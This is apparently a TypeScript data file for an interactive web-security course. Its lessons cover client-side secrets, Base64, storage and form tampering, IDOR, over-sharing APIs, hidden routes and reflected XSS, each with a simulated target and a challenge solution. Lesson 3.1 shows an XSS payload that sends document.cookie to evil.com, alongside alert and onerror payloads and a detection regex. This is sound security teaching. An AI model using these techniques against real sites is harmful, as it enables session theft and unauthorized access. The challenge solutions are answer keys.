import { Track } from '../types';

export const VIDERE_TRACKS: Track[] = [
  {
    id: 'track-1',
    number: 1,
    title: 'What the Browser Whispers',
    shortDescription: 'Demystifying client-side architecture, DevTools, storage fallacies, and encoded secrets.',
    philosophyBadge: 'The Discovery of Visibility',
    iconName: 'Eye',
    colorAccent: 'emerald',
    lessons: [
      {
        id: 'lesson-1-1',
        trackId: 'track-1',
        number: '1.1',
        title: 'The DevTools Illusion & HTML Secrets',
        tagline: 'Before a web page is rendered as sleek glass, it is plain text delivered to your machine.',
        estimatedMinutes: 8,
        difficulty: 'Beginner',
        mentalModelConcept: 'The browser is your sandbox, not the server’s fortress. Anything sent to your browser is completely readable and editable by you.',
        discoveryPrompt: 'A company login portal claims their beta admin dashboard is strictly invite-only. Look at the page source in the simulated DevTools below. Do you notice anything a developer left behind?',
        discoveryComponent: 'DevToolsInspection',
        noticeThisMoments: [
          'Notice HTML comments like <!-- TODO: remove before prod --> — developers often forget that comments are sent over the wire!',
          'Notice hidden inputs (<input type="hidden">) containing pricing, role definitions, or discount codes.',
          'Notice disabled buttons (<button disabled>) where the UI disables the click, but the underlying endpoint remains unguarded.'
        ],
        explanationMarkdown: `
### The Mental Model: The Glass Box Fallacy

Many people treat web browsers like televisions: you turn them on, and the image appears. If something is grayed out or off-screen, you assume it doesn't exist.

**In reality, a browser is an open glass workshop.**
When you navigate to \`https://example.com\`, the web server packs up a box of HTML, CSS, and JavaScript files and hands them across the internet to **your computer**. Your local browser parses those files and renders buttons, colors, and layouts.

This means:
1. **You own the execution environment.** You can open DevTools (F12 or right-click -> Inspect) and modify any text, CSS class, or attribute in real-time.
2. **Hidden is not protected.** If a developer wrote \`<button style="display: none">\` or disabled a button with \`disabled\`, the logic to trigger the request might already be right there in your client code.
3. **HTML Comments are public.** Any comment written inside HTML like \`<!-- Debug token: DEV_98124 -->\` is fully visible to anyone who right-clicks and inspects the page.

> **The Habit to Build:** When inspecting a web app, don't look just at the rendered paint. Look at what was delivered into the DOM. What is hidden with CSS? What attributes exist that the user never sees?
        `,
        devTakeaway: 'Never rely on client-side hiding, disabled attributes, or HTML comments to protect sensitive data or actions. Always authorize on the server.',
        securityTakeaway: 'Always open the Elements tab and search for keywords like "TODO", "debug", "token", "hidden", or "disabled".',
        challenge: {
          id: 'chal-1-1',
          type: 'inspect',
          prompt: 'Inspect the simulated login portal below using the Elements tab. Find the hidden developer bypass code left in the HTML comments and enter it to unlock the dashboard.',
          targetHint: 'Look inside the <form> tags for an HTML comment <!-- ... --> left by dev team.',
          solution: 'DEV_BYPASS_8842',
          successMessage: 'Spot on! You noticed the developer comment. In real-world audits, developers frequently leave staging credentials, test tokens, or endpoints in client comments.',
          explanation: 'HTML comments are stripped by some build pipelines, but in countless production apps, Vite/Webpack comments or raw source still ship straight to the client browser.'
        },
        simulatedTarget: {
          appName: 'Nexus Corp Staff Portal',
          targetUrl: 'https://internal.nexuscorp.io/auth/login',
          description: 'Restricted authentication gateway for staff and contractors.',
          htmlSource: `<!DOCTYPE html>
<html>
  <head>
    <title>Nexus Staff Portal</title>
  </head>
  <body class="bg-slate-900 text-slate-100 p-6 font-sans">
    <div class="max-w-md mx-auto bg-slate-800 p-6 rounded-lg border border-slate-700">
      <h2 class="text-xl font-bold mb-4">Staff Authentication</h2>
      <form id="login-form">
        <!-- Developer Note: Emergency bypass token for QA testing: DEV_BYPASS_8842 -->
        <!-- Remember to strip this before production release v2.4 -->
        <div class="mb-4">
          <label class="block text-xs uppercase text-slate-400 mb-1">Email</label>
          <input type="email" value="alex.chen@nexuscorp.io" readonly class="w-full bg-slate-950 border border-slate-700 px-3 py-2 rounded text-slate-300" />
        </div>
        <div class="mb-4">
          <label class="block text-xs uppercase text-slate-400 mb-1">Bypass Code / Access Key</label>
          <input type="text" placeholder="Enter key..." class="w-full bg-slate-950 border border-slate-700 px-3 py-2 rounded text-slate-100" />
        </div>
        <input type="hidden" name="user_role" value="contractor" />
        <input type="hidden" name="client_can_elevate" value="false" />
        <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 font-semibold py-2 rounded transition">
          Authenticate
        </button>
      </form>
    </div>
  </body>
</html>`,
          storageItems: [
            { key: 'nexus_theme', value: 'dark', type: 'localStorage' },
            { key: 'nexus_session_state', value: 'unverified_client', type: 'cookie' }
          ],
          networkRequests: [
            {
              url: '/api/v1/health',
              method: 'GET',
              status: 200,
              headers: { 'Content-Type': 'application/json', 'Server': 'nginx/1.24' },
              response: { status: 'healthy', version: '2.4.0-rc3' }
            }
          ]
        }
      },
      {
        id: 'lesson-1-2',
        trackId: 'track-1',
        number: '1.2',
        title: 'The Mystery String (Base64 vs Encryption)',
        tagline: 'When beginners see gibberish strings ending in "=", they assume military-grade encryption. It is usually just Base64.',
        estimatedMinutes: 10,
        difficulty: 'Beginner',
        mentalModelConcept: 'Encoding is not encryption. Encoding changes data format for transmission; anyone can decode it instantly without a secret key.',
        discoveryPrompt: 'Here is a session token found in an authentication cookie: `eyJ1c2VyIjoidmlzaXRvciIsInJvbGUiOiJndWVzdCIsImlzQWRtaW4iOmZhbHNlfQ==`. Does it look like an uncrackable cipher? Hit the decode button below and see what is actually inside.',
        discoveryComponent: 'Base64DecodeDemo',
        noticeThisMoments: [
          'Notice how Base64 strings frequently end with "=" or "==" padding.',
          'Notice how JSON Web Tokens (JWT) are simply three Base64URL-encoded strings separated by two dots (header.payload.signature).',
          'Notice that when you decode a Base64 string, you can read passwords, usernames, and role flags directly without guessing any password.'
        ],
        explanationMarkdown: `
### The Mental Model: Packaging vs Padlocking

Think of sending a fragile porcelain mug through the postal mail:
* **Encoding (Base64)** is placing the mug inside a cardboard box with bubble wrap so the postal conveyor belt doesn't shatter it. Anyone who intercepts the box can open the cardboard flaps with their bare hands in two seconds.
* **Encryption (AES, RSA)** is placing the mug inside a 500-pound steel safe with a 64-digit combination padlock. Nobody can see inside unless they hold the exact cryptographic key.

#### Why Base64 Exists
Computers frequently need to transfer binary data (like images or arbitrary bytes) across protocols that only understand ASCII text (like HTTP headers or email). Base64 converts any 8-bit binary stream into a safe alphabet of 64 characters (\`A-Z\`, \`a-z\`, \`0-9\`, \`+\`, \`/\`).

When a junior developer stores:
\`\`\`json
{"username":"alex","role":"guest","isAdmin":false}
\`\`\`
as:
\`\`\`
eyJ1c2VybmFtZSI6ImFsZXgiLCJyb2xlIjoiZ3Vlc3QiLCJpc0FkbWluIjpmYWxzZX0=
\`\`\`
...they might feel like they have secured the data because human eyes can't read it at a glance. But every browser, script, and attacker can convert it back instantly.

> **The Habit to Build:** The moment you see a long alphanumeric string with upper/lower case letters and ending in \`=\` or \`==\`, don't think "cryptography." Think "Base64 packaging." Pop it into a decoder immediately.
        `,
        devTakeaway: 'Never store secrets, user permissions, or trust flags in Base64 thinking it conceals them. Use signed, encrypted server sessions.',
        securityTakeaway: 'Always decode cookies and authorization headers. You will be amazed how often raw JSON or unhashed credentials are right in front of you.',
        challenge: {
          id: 'chal-1-2',
          type: 'decode',
          prompt: 'A web app passed this authorization cookie value: "eyJ1c2VyIjoiZGV2X3RlYW0iLCJmbGFnIjoiaW50dWl0aW9uX292ZXJfdG9vbHMifQ==". Decode it and submit the secret flag value stored inside the JSON.',
          targetHint: 'Paste the string into the decoder or use the live decode tool. Look at the "flag" key.',
          solution: 'intuition_over_tools',
          successMessage: 'Brilliant! You just broke the illusion. A string that looked like a cryptographic hash was merely a JSON object wrapped in Base64.',
          explanation: 'Because Base64 is reversible by design without any secret key, treating it as security is one of the most common web anti-patterns.'
        },
        simulatedTarget: {
          appName: 'CloudStream Video Portal',
          targetUrl: 'https://stream.nexus.local/watch?v=8491',
          description: 'Streaming dashboard with account tier stored in a cookie.',
          htmlSource: `<div class="p-4 bg-slate-900 text-white">
  <h1 class="text-lg font-bold">CloudStream Player</h1>
  <p class="text-sm text-slate-400">Current Tier: Standard (Ads Enabled)</p>
</div>`,
          storageItems: [
            { key: 'session_auth', value: 'eyJ1c2VyIjoiZGV2X3RlYW0iLCJmbGFnIjoiaW50dWl0aW9uX292ZXJfdG9vbHMifQ==', type: 'cookie' },
            { key: 'preferred_quality', value: '1080p', type: 'localStorage' }
          ],
          networkRequests: []
        }
      },
      {
        id: 'lesson-1-3',
        trackId: 'track-1',
        number: '1.3',
        title: "What's Living in Your Storage?",
        tagline: 'LocalStorage and Cookies are saved directly on the client machine. Why do apps trust what they find there?',
        estimatedMinutes: 9,
        difficulty: 'Beginner',
        mentalModelConcept: 'Client-side storage is completely user-controlled. If the frontend checks `localStorage.getItem("role") === "admin"` to show an admin panel, anyone can change that value.',
        discoveryPrompt: 'Look at the simulated application below. It tells you that only VIP users can access the analytics portal. Open the Storage tab in DevTools. What is in LocalStorage?',
        discoveryComponent: 'StorageTamperDemo',
        noticeThisMoments: [
          'Notice how easily values in LocalStorage can be read and edited through the DevTools Application/Storage tab.',
          'Notice when a web application checks permissions in JavaScript: `if (user.isVip) { showSecretData() }`. The client controls that boolean!',
          'Notice cookies without the `HttpOnly` flag can be read and modified by JavaScript directly via `document.cookie`.'
        ],
        explanationMarkdown: `
### The Mental Model: Trusting the Customer's Notepad

Imagine a bank telling a customer: *"Write down your account balance on this sticky note and keep it in your pocket. Whenever you want to withdraw cash, just show the teller what you wrote on your sticky note."*

That sounds absurd, right? **Yet thousands of web applications do this every single day with \`localStorage\` and non-HttpOnly cookies.**

#### How It Happens in Code
A developer writes:
\`\`\`javascript
// Naive Frontend Code:
const userProfile = JSON.parse(localStorage.getItem('currentUser'));
if (userProfile.tier === 'vip') {
  document.getElementById('vip-content').classList.remove('hidden');
}
\`\`\`
If the server doesn't re-validate the user's tier on every sensitive API request, the user can simply type into their console:
\`\`\`javascript
localStorage.setItem('currentUser', JSON.stringify({ name: 'Alex', tier: 'vip' }));
\`\`\`
...refresh the page, and the client-side code will happily render the VIP views!

> **The Habit to Build:** Whenever an application displays a "Locked", "Premium Only", or "Admin Restricted" screen, check LocalStorage, SessionStorage, and Cookies. Ask: *"Is the server checking this, or is this just client-side theater?"*
        `,
        devTakeaway: 'Never use LocalStorage for authorization checks or secret tokens. Always verify roles server-side on every protected API route.',
        securityTakeaway: 'Inspect client storage for role flags like "isAdmin", "tier", or "plan". Try changing them and reloading to see what unlocks.',
        challenge: {
          id: 'chal-1-3',
          type: 'tamper',
          prompt: 'Use the interactive Storage panel below to modify the "account_tier" key in LocalStorage from "basic" to "superadmin". Then trigger the validation check to claim the access badge.',
          targetHint: 'Select the key "account_tier" in the storage table and change its value to "superadmin".',
          solution: 'superadmin',
          successMessage: 'Access granted! You exposed client-side authorization. The frontend unlocked the feature immediately because it trusted client storage without verifying against a backend authority.',
          explanation: 'LocalStorage is meant for user preferences (like dark mode or table sorting), never for authorization gates.'
        },
        simulatedTarget: {
          appName: 'SaaS Pulse Analytics',
          targetUrl: 'https://pulse.app/dashboard',
          description: 'Executive dashboard with tier-gated metrics.',
          htmlSource: `<div class="p-6 bg-slate-900 border border-slate-800 rounded-lg">
  <h2 class="text-lg font-bold text-slate-100">Executive Revenue Analytics</h2>
  <div id="locked-banner" class="mt-4 p-4 bg-amber-950/40 border border-amber-800/60 rounded text-amber-200 text-sm">
    🔒 Tier Locked: Your current account tier is <strong>basic</strong>. Upgrade to <strong>superadmin</strong> to view quarterly revenue.
  </div>
</div>`,
          storageItems: [
            { key: 'account_tier', value: 'basic', type: 'localStorage' },
            { key: 'user_display_name', value: 'Jordan Guest', type: 'localStorage' },
            { key: 'session_tracker', value: 'trk_9921_anon', type: 'cookie' }
          ],
          networkRequests: []
        }
      },
      {
        id: 'lesson-1-4',
        trackId: 'track-1',
        number: '1.4',
        title: 'Client-Side Validation is a Suggestion',
        tagline: 'HTML inputs say "maxlength=10" or "disabled". Who says your browser has to obey them?',
        estimatedMinutes: 9,
        difficulty: 'Beginner',
        mentalModelConcept: 'Form validation attributes (required, min, max, disabled) are user convenience features, not security controls.',
        discoveryPrompt: 'Try submitting the store checkout form below with a negative quantity or by removing the disabled attribute from the "Apply 100% Staff Voucher" button. What stops you?',
        discoveryComponent: 'FormBypassDemo',
        noticeThisMoments: [
          'Notice how input fields have attributes like `min="1"`, `max="10"`, or `pattern="[0-9]+"`. These run in your browser, not on the server.',
          'Notice disabled submit buttons: simply double-clicking or editing the HTML tag to delete `disabled` lets you click it.',
          'Notice hidden inputs like `<input type="hidden" name="unit_price" value="49.99">`. If the server trusts this incoming price, you can buy anything for $0.01!'
        ],
        explanationMarkdown: `
### The Mental Model: The Unenforceable Honor System

Imagine a shop with a sign that says: *"Please do not pay less than $10 for a t-shirt."* But instead of a cashier at the register, there is an open drop-box where you deposit whatever coins you feel like and walk out the door.

When developers use:
\`\`\`html
<input type="number" min="1" max="5" value="1" name="quantity" />
<input type="hidden" name="price" value="99.00" />
\`\`\`
...without checking the values on their backend server, they are using the honor system.

#### Why Client-Side Validation Exists
Client validation exists for **UX (User Experience)**:
* Red borders when an email is missing an \`@\` symbol so the user doesn't wait for a slow network roundtrip.
* Instant feedback so users don't submit empty fields.

**It does NOT exist for security.** An attacker doesn't even need to use your HTML form — they can send an HTTP POST request using \`curl\`, Postman, or Python with \`{"price": "-500", "quantity": 100}\`.

> **The Habit to Build:** Whenever you see a restriction in a web UI (a disabled button, a restricted dropdown, a character limit, or an uneditable field), ask: *"If I strip this attribute in DevTools and submit, does the server actually push back?"*
        `,
        devTakeaway: 'Always validate types, ranges, permissions, and pricing on the backend server. Treat all client submissions as potentially hostile.',
        securityTakeaway: 'Remove disabled attributes, change hidden input values, and test boundary conditions (negative numbers, zero, huge numbers).',
        challenge: {
          id: 'chal-1-4',
          type: 'tamper',
          prompt: 'The checkout form has a hidden price input of $120.00. Tamper with the form or parameter to set the price to 1.00 and submit the purchase.',
          targetHint: 'Inspect the form fields, find the unit_price input, and change its value to "1.00" before clicking Checkout.',
          solution: '1.00',
          successMessage: 'Order confirmed for $1.00! You exploited parameter tampering. The developer trusted the price sent by the client instead of querying their database for the authoritative price.',
          explanation: 'Never trust data from the client about pricing, roles, or limits. The backend must always look up the authoritative price from its own database.'
        },
        simulatedTarget: {
          appName: 'DevGear Store Checkout',
          targetUrl: 'https://store.devgear.io/cart/checkout',
          description: 'Hardware store with client-populated pricing parameters.',
          htmlSource: `<div class="bg-slate-900 border border-slate-800 p-6 rounded-lg max-w-md mx-auto text-slate-100">
  <h3 class="font-bold text-lg mb-2">Mechanical Keyboard - RGB Pro</h3>
  <p class="text-emerald-400 font-mono text-xl mb-4">$120.00</p>
  <form id="checkout-form">
    <input type="hidden" id="unit_price" name="unit_price" value="120.00" />
    <input type="hidden" name="product_id" value="KB-99" />
    <div class="mb-4">
      <label class="block text-xs uppercase text-slate-400 mb-1">Quantity</label>
      <input type="number" min="1" max="3" value="1" class="w-full bg-slate-950 border border-slate-700 px-3 py-2 rounded" />
    </div>
    <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 py-2 rounded font-semibold transition">
      Pay & Complete Order
    </button>
  </form>
</div>`,
          storageItems: [
            { key: 'cart_id', value: 'cart_99128', type: 'localStorage' }
          ],
          networkRequests: [
            {
              url: '/api/checkout/submit',
              method: 'POST',
              status: 200,
              headers: { 'Content-Type': 'application/json' },
              body: { product_id: 'KB-99', unit_price: 120.00, quantity: 1 },
              response: { success: true, total: 120.00 }
            }
          ]
        }
      }
    ]
  },
  {
    id: 'track-2',
    number: 2,
    title: 'The Predictable Web',
    shortDescription: 'Parameters, IDOR vulnerabilities, excessive API data exposure, and broken object level authorization.',
    philosophyBadge: 'The Architecture of Assumptions',
    iconName: 'Hash',
    colorAccent: 'cyan',
    lessons: [
      {
        id: 'lesson-2-1',
        trackId: 'track-2',
        number: '2.1',
        title: 'The Sequential Guess (Insecure Direct Object Reference)',
        tagline: 'When an address bar says "/invoice?id=1042", the most human question in the world is: what is at 1041?',
        estimatedMinutes: 10,
        difficulty: 'Beginner',
        mentalModelConcept: 'IDOR happens when an application uses user-supplied input to access database records directly without verifying whether the requesting user actually owns that record.',
        discoveryPrompt: 'You just downloaded your medical insurance receipt at `/receipts/view?id=4028`. Look at the number in the address bar. Try changing 4028 to 4027. What happens?',
        discoveryComponent: 'IdorExplorerDemo',
        noticeThisMoments: [
          'Notice sequential, auto-incrementing integers in URLs: `/user/582`, `/orders/1092`, `/documents/44`.',
          'Notice when a system authenticates you as user Alice, but still lets you fetch Bob’s records if you simply know Bob’s record number.',
          'Notice the difference between Authentication ("Who are you?") and Authorization ("Are you allowed to view this specific item?").'
        ],
        explanationMarkdown: `
### The Mental Model: The Coat Check Room Without Claim Tickets

Imagine checking your winter coat at a luxury theater. The attendant takes your coat, hangs it on hook #142, and smiles. When you return at intermission, the attendant doesn't ask for a claim ticket or your photo ID; they just ask:
*"Which hook number would you like?"*

You say: *"Hook 141, please."* And without checking whether hook 141 belongs to you, the attendant hands you someone else's expensive cashmere coat.

**That is Insecure Direct Object Reference (IDOR).**

#### The Flawed Backend Code
\`\`\`sql
-- What the naive query looks like:
SELECT * FROM receipts WHERE id = 1041;
\`\`\`
Notice what is missing? **The query never checks who is asking!**

#### What It Should Have Been:
\`\`\`sql
-- Proper Authorization:
SELECT * FROM receipts WHERE id = 1041 AND user_id = CURRENT_LOGGED_IN_USER_ID;
\`\`\`

If \`CURRENT_LOGGED_IN_USER_ID\` is not the owner, the database returns 0 rows, and the server returns \`403 Forbidden\` or \`404 Not Found\`.

> **The Habit to Build:** Any time you see a numeric ID, a filename, or a slug in a URL query parameter or JSON body (\`?id=123\`, \`{"docId": 456}\`), immediately ask: *"Did the server verify that I own this ID, or is it just fetching whatever number I give it?"*
        `,
        devTakeaway: 'Always scope database queries to the authenticated session user (e.g. WHERE id = :id AND tenant_id = :tenant). Never trust client-supplied IDs blindly.',
        securityTakeaway: 'Look for predictable identifiers in requests. Test adjacent numbers (n-1, n+1) or test another test account’s ID.',
        challenge: {
          id: 'chal-2-1',
          type: 'idor',
          prompt: 'You are logged in as customer Alex (User ID #892). Your invoice is #5002. Change the invoice ID parameter to discover the confidential contract belonging to client #5001 and submit their company name.',
          targetHint: 'In the simulated browser URL bar, edit the query parameter to id=5001 and press Enter.',
          solution: 'Vanguard Aerospace',
          successMessage: 'Confidential record exposed! You uncovered an IDOR flaw. By changing 5002 to 5001, you bypassed authorization and accessed another tenant’s private documents.',
          explanation: 'IDOR remains one of the most prolific and high-payout vulnerabilities in modern bug bounty programs because automated scanners frequently miss business-logic ownership flaws.'
        },
        simulatedTarget: {
          appName: 'Invoicer Cloud ERP',
          targetUrl: 'https://invoicer.cloud/portal/invoice?id=5002',
          description: 'Enterprise invoice and contract repository.',
          htmlSource: `<div class="p-6 bg-slate-900 border border-slate-800 rounded-lg text-slate-100">
  <div class="flex justify-between items-center border-b border-slate-800 pb-4 mb-4">
    <h2 class="text-xl font-bold">Invoice #5002</h2>
    <span class="px-3 py-1 bg-emerald-950 text-emerald-400 border border-emerald-800 rounded text-xs">Paid</span>
  </div>
  <p class="text-sm text-slate-400">Client: <strong>Alex Chen Designs</strong></p>
  <p class="text-sm text-slate-400">Amount: <strong>$1,450.00 USD</strong></p>
  <p class="text-xs text-slate-500 mt-4">Invoice URL: /portal/invoice?id=5002</p>
</div>`,
          storageItems: [
            { key: 'session_user_id', value: '892', type: 'cookie' },
            { key: 'session_token', value: 'sess_992a8b', type: 'cookie' }
          ],
          networkRequests: [
            {
              url: '/api/v1/invoices/5002',
              method: 'GET',
              status: 200,
              headers: { 'Content-Type': 'application/json' },
              response: { id: 5002, client: 'Alex Chen Designs', amount: 1450, secret_memo: 'Standard rate' }
            }
          ]
        }
      },
      {
        id: 'lesson-2-2',
        trackId: 'track-2',
        number: '2.2',
        title: 'The Over-Sharing API (Excessive Data Exposure)',
        tagline: 'The UI looks clean and minimal. But open the Network tab, and the server just sent your entire database row.',
        estimatedMinutes: 9,
        difficulty: 'Beginner',
        mentalModelConcept: 'Frontends and backends are separate. The browser only renders what the UI code specifies, but the Network response contains everything the API returned.',
        discoveryPrompt: 'A team member directory only displays the person’s Name, Job Title, and Avatar photo. Open the Network tab in DevTools and look at the actual JSON response for `/api/v1/members`. What else is in there?',
        discoveryComponent: 'NetworkInspectorDemo',
        noticeThisMoments: [
          'Notice how modern frameworks use `SELECT * FROM users` and serialize the whole database model straight into JSON.',
          'Notice fields like `ssn`, `password_hash`, `stripe_customer_id`, `internal_risk_score`, or `backup_codes` sent over the wire even though no component renders them.',
          'Notice how easy it is to miss this if you only look at the webpage instead of the Network tab.'
        ],
        explanationMarkdown: `
### The Mental Model: The Lazy Delivery Driver

Imagine ordering a single book online. When the delivery truck arrives at your house, the driver unloads their **entire truck full of packages for the whole neighborhood** onto your front lawn and says:
*"Your book is somewhere in there. Just take your book and ignore the rest of the boxes."*

Most polite people will just pick up their book. But anyone who takes a look at the other boxes has just been handed the entire neighborhood’s mail.

#### How Developers Fall Into This Trap
An engineer writes:
\`\`\`typescript
// Backend Express route:
app.get('/api/users/:id', async (req, res) => {
  const user = await db.user.findUnique({ where: { id: req.params.id } });
  res.json(user); // Sends passwordHash, salt, twoFactorSecret, role, salary!
});
\`\`\`
On the frontend React component, the developer writes:
\`\`\`tsx
<h1>{user.name}</h1>
<p>{user.title}</p>
\`\`\`
The page looks completely innocent! But anyone opening DevTools -> Network -> Response can see the entire unscrubbed user record.

> **The Habit to Build:** Always inspect the raw Network response bodies of API requests. Don't assume the UI displays everything the server transmitted.
        `,
        devTakeaway: 'Use Data Transfer Objects (DTOs) or explicit serializer schemas to whitelist exactly which fields leave the server. Never send raw database entities.',
        securityTakeaway: 'Examine API responses for sensitive fields (email, phone, internal roles, API keys, password hashes) that are fetched but never displayed on the screen.',
        challenge: {
          id: 'chal-2-2',
          type: 'inspect',
          prompt: 'Inspect the `/api/v2/team/profile` network request response. Find the leaked internal infrastructure credential key name or secret value and submit the leaked API key.',
          targetHint: 'Open the Network tab in DevTools, click on the profile request, and inspect the JSON response body.',
          solution: 'sk_live_9948271a',
          successMessage: 'Well done! You pulled the thread. Even though the employee badge widget only rendered their photo and team name, the backend carelessly serialized the full internal API secret.',
          explanation: 'Excessive Data Exposure is one of the OWASP API Top 10 vulnerabilities. Filtering in the browser is never a substitute for filtering on the server.'
        },
        simulatedTarget: {
          appName: 'CollabSpace Directory',
          targetUrl: 'https://collabspace.internal/team/view?id=12',
          description: 'Internal employee contact directory.',
          htmlSource: `<div class="p-6 bg-slate-900 border border-slate-800 rounded-lg text-slate-100 max-w-sm">
  <div class="w-16 h-16 rounded-full bg-cyan-700 flex items-center justify-center font-bold text-xl mb-4">
    SC
  </div>
  <h3 class="font-bold text-lg">Sarah Connor</h3>
  <p class="text-cyan-400 text-sm">Lead Infrastructure Engineer</p>
  <p class="text-slate-400 text-xs mt-2">Department: Cloud Operations</p>
</div>`,
          storageItems: [
            { key: 'org_id', value: 'org_omega_9', type: 'localStorage' }
          ],
          networkRequests: [
            {
              url: '/api/v2/team/profile',
              method: 'GET',
              status: 200,
              headers: { 'Content-Type': 'application/json' },
              response: {
                id: 12,
                name: 'Sarah Connor',
                title: 'Lead Infrastructure Engineer',
                department: 'Cloud Operations',
                salary_bracket: 'Band-8',
                internal_deploy_key: 'sk_live_9948271a',
                ssh_user: 'sconnor_admin'
              }
            }
          ]
        }
      },
      {
        id: 'lesson-2-3',
        trackId: 'track-2',
        number: '2.3',
        title: 'Hidden Verbs & Invisible Routes',
        tagline: 'JavaScript bundles contain the blueprints of every API endpoint the developers ever built.',
        estimatedMinutes: 10,
        difficulty: 'Intermediate',
        mentalModelConcept: 'Single Page Applications (SPAs) bundle their routing tables and API client code into public JavaScript files. Reading them reveals hidden admin portals and unlinked endpoints.',
        discoveryPrompt: 'Look at the compiled frontend bundle `app.chunk.js` in the simulated Sources tab. Can you spot an unlinked admin export endpoint?',
        discoveryComponent: 'SourcesInspectorDemo',
        noticeThisMoments: [
          'Notice how frontend bundlers pack API paths like `/api/admin/export-database` right into the client-side JavaScript.',
          'Notice how HTTP methods (GET, POST, PUT, DELETE) are defined in client API wrappers.',
          'Notice comments or source maps (`.map` files) that restore original TypeScript files.'
        ],
        explanationMarkdown: `
### The Mental Model: The Hotel Floorplan

When you check into a hotel, the keycard you are given might only unlock room 204. But if you walk into the lobby, there is a giant fire evacuation floorplan hanging on the wall that shows the secret laundry chutes, the rooftop service elevator, and the master electrical closet.

**Client-side JavaScript bundles are that floorplan.**

When modern applications build with React, Vue, or Angular, all route definitions, API service files, and role logic get compiled into static \\x60.js\\x60 files.

Even if there is no button in the UI for "Export All User Data", you will often find:
\`\`\`javascript
const exportUsersUrl = "/api/v1/internal/export-all";
\`\`\`
...sitting in the bundle, because a developer created the component for internal admins and bundled it together into the same production build.

> **The Habit to Build:** Always search JavaScript files for strings like /admin, /v1/, /export, /internal, or /debug. You will often find endpoints that have no UI buttons leading to them.
        `,
        devTakeaway: 'Split admin bundles away from public client bundles using code-splitting, and secure all endpoints with robust server-side RBAC.',
        securityTakeaway: 'Search client JS bundles for endpoint paths, API routes, and hidden features that developers assumed were invisible because no link points to them.',
        challenge: {
          id: 'chal-2-3',
          type: 'inspect',
          prompt: 'Inspect the JavaScript file in the Sources tab. Find the unlinked bulk export endpoint path (starts with /api/...) and enter it here.',
          targetHint: 'Open the Sources tab, look inside bundle.js, and look for "ADMIN_ROUTES" or "export".',
          solution: '/api/v3/internal/bulk-export',
          successMessage: 'Endpoint uncovered! You found an unlinked API path through static code inspection. If the server doesn’t guard this route, an attacker can trigger sensitive operations directly.',
          explanation: 'Obscurity is not security. If an endpoint exists on a web server, someone will find it simply by reading the JavaScript files that you delivered to their browser.'
        },
        simulatedTarget: {
          appName: 'FleetTrack Logistics',
          targetUrl: 'https://fleettrack.io/dashboard/map',
          description: 'Vehicle GPS tracking web application.',
          htmlSource: `<div class="p-4 bg-slate-900 text-slate-100">
  <h2 class="font-bold">Active Fleet Vehicles (4 Online)</h2>
  <script src="/static/js/bundle.js"></script>
</div>`,
          storageItems: [],
          networkRequests: [
            {
              url: '/static/js/bundle.js',
              method: 'GET',
              status: 200,
              headers: { 'Content-Type': 'application/javascript' },
              response: `// FleetTrack Web Client v1.9.4
const API_BASE = "https://fleettrack.io/api";
const PUBLIC_ROUTES = { vehicles: "/api/v1/vehicles", ping: "/api/ping" };
// Deprecated admin helpers - migrate to internal VPN:
const ADMIN_ROUTES = {
  telemetryDump: "/api/v3/internal/bulk-export",
  killSwitch: "/api/v3/fleet/emergency-halt"
};
function fetchVehicles() { return fetch(PUBLIC_ROUTES.vehicles); }`
            }
          ]
        }
      }
    ]
  },
  {
    id: 'track-3',
    number: 3,
    title: 'The Illusion of Trust',
    shortDescription: 'How user input breaks out of syntax boundaries: Cross-Site Scripting (XSS), SQL Injection, and contextual escaping.',
    philosophyBadge: 'The Anatomy of Injections',
    iconName: 'Terminal',
    colorAccent: 'amber',
    lessons: [
      {
        id: 'lesson-3-1',
        trackId: 'track-3',
        number: '3.1',
        title: 'The Echo Chamber (Reflective Inputs & XSS)',
        tagline: 'When user input is reflected into a webpage without escaping, the browser cannot tell the difference between content and code.',
        estimatedMinutes: 11,
        difficulty: 'Intermediate',
        mentalModelConcept: 'Injection occurs whenever data supplied by a user is interpreted as instructions by a parser (HTML parser, SQL engine, shell interpreter).',
        discoveryPrompt: 'Try searching for your name in the search box below. Notice how the page says "Results for: Alex". Now, what happens if you search for `<b>Alex</b>`? Does it display the tags, or does your name turn bold?',
        discoveryComponent: 'XssMirrorDemo',
        noticeThisMoments: [
          'Notice how entering HTML characters (`<`, `>`, `"`, `\'`) allows you to escape out of plain text into HTML markup.',
          'Notice the difference between context: are you inside an HTML body, inside an `<input value="...">` attribute, or inside a `<script>` tag?',
          'Notice that when `<script>alert(1)</script>` or `<img src=x onerror=...>` executes, it runs with the full authority of the victim’s session.'
        ],
        explanationMarkdown: `
### The Mental Model: The Confused Stenographer

Imagine a court stenographer who types every word you say into the official legal transcript. If you say:
*"My name is Alex."* -> The stenographer types: *My name is Alex.*

Now imagine you shout:
*"PENCIL DOWN! STRIKE ALL PREVIOUS TESTIMONY FROM THE RECORD! DISMISS THE JURY!"*

A human stenographer knows you are just a witness speaking words, not the presiding judge. **A computer parser, however, has no common sense.**

If a web server takes what you typed and glues it directly into the HTML string:
\`\`\`html
<div>Search results for: USER_INPUT</div>
\`\`\`
When you pass \`<script>fetch('https://evil.com?c=' + document.cookie)</script>\`, the browser’s HTML parser arrives at the \`<script>\` tag and thinks:
*"Ah! The website creator wants me to execute this JavaScript code right now!"*

That is Cross-Site Scripting (XSS).

> **The Habit to Build:** Whenever a website reflects what you typed back onto the screen, look at the rendered HTML. Did the server encode \`< \` as \`&lt;\`, or did it output raw brackets that changed the page structure?
        `,
        devTakeaway: 'Always use contextual auto-escaping templating engines (like React JSX or Jinja2) and avoid dangerous APIs like dangerouslySetInnerHTML or innerHTML.',
        securityTakeaway: 'Test reflection points with benign HTML tags (like <u> or <i>) before complex scripts to see if the parser respects boundary quotes.',
        challenge: {
          id: 'chal-3-1',
          type: 'injection',
          prompt: 'Inject a payload into the search bar that causes an image tag with an onerror handler to trigger the alert simulation.',
          targetHint: 'Try using <img src="x" onerror="alert(1)"> or <u class="font-bold">test</u>.',
          solution: (input: string) => /<img.*onerror.*>/i.test(input) || /<script.*>/i.test(input) || /onerror\s*=/i.test(input),
          successMessage: 'Syntax boundary broken! You executed JavaScript through reflected input. The browser interpreted your data as executable instruction.',
          explanation: 'XSS allows attackers to hijack sessions, steal cookies, or perform actions on behalf of any user who views the page.'
        },
        simulatedTarget: {
          appName: 'BookVault Search',
          targetUrl: 'https://bookvault.com/search?q=Cybersecurity',
          description: 'Library catalog with reflected search term.',
